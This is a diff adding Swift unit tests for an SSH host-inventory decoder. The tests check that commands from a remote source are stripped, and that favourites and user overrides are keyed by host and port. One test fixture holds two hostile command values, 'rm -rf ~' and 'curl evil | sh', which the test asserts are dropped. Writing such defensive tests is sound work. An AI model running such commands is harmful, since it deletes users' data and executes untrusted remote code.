@@ -126,6 +126,67 @@ private func makeTempDir() -> URL {
     #expect(hosts[2].command == "ssh 'deploy@web01'") // no remote command → plain connect
 }
 
+@Test func remoteDecodeStripsCommandsAndUsesDefaultUser() throws {
+    // A remote source provides inventory only: `command` and `remoteCommand`
+    // must never be honored, and the login user comes from the default.
+    let json = """
+    {
+      "groups": [{
+        "name": "g",
+        "hosts": [
+          { "name": "plain", "host": "web01" },
+          { "name": "evil-raw", "command": "rm -rf ~" },
+          { "name": "evil-remote", "host": "web02", "remoteCommand": "curl evil | sh" }
+        ]
+      }]
+    }
+    """
+    let hosts = try JSONHostStore.decode(Data(json.utf8), defaultUser: "deploy", allowCommands: false).first!.hosts
+    #expect(hosts[0].command == "ssh 'deploy@web01'")
+    // The raw command is ignored — it becomes a plain connect to the name as host.
+    #expect(hosts[1].command == "ssh 'deploy@evil-raw'")
+    #expect(!hosts[1].command.contains("rm -rf"))
+    // The remote command is dropped (no `-t`, no appended command).
+    #expect(hosts[2].command == "ssh 'deploy@web02'")
+    #expect(!hosts[2].command.contains("curl"))
+}
+
+@Test func remoteFavoritesAreAppliedByHostKey() throws {
+    let json = """
+    { "groups": [{ "name": "g", "hosts": [
+        { "name": "a", "host": "web01" },
+        { "name": "b", "host": "db", "port": 2222 }
+    ]}]}
+    """
+    let favKey = RemoteUserOverrides.key(host: "db", port: 2222)
+    let hosts = try JSONHostStore.decode(Data(json.utf8), allowCommands: false, favoriteKeys: [favKey]).first!.hosts
+    #expect(hosts[0].favorite == false)
+    #expect(hosts[1].favorite == true)
+    #expect(hosts[1].favoriteKey == favKey)
+}
+
+@Test func remoteUserOverrideWinsAndIsKeyedByHostPort() throws {
+    let json = """
+    {
+      "groups": [{
+        "name": "g",
+        "hosts": [
+          { "name": "a", "host": "web01" },
+          { "name": "b", "host": "db", "port": 2222 }
+        ]
+      }]
+    }
+    """
+    let overrides = [
+        RemoteUserOverrides.key(host: "web01", port: nil): "alice",
+        RemoteUserOverrides.key(host: "db", port: 2222): "bob",
+    ]
+    let hosts = try JSONHostStore.decode(Data(json.utf8), defaultUser: "deploy",
+                                         allowCommands: false, userOverrides: overrides).first!.hosts
+    #expect(hosts[0].command == "ssh 'alice@web01'")     // override beats the default user
+    #expect(hosts[1].command == "ssh -p 2222 'bob@db'")  // keyed by host:port
+}
+
 @Test func jsonAppliesDefaultUserUnlessOverridden() throws {
     let dir = makeTempDir(); defer { try? FileManager.default.removeItem(at: dir) }
     let url = dir.appendingPathComponent("servers.json")
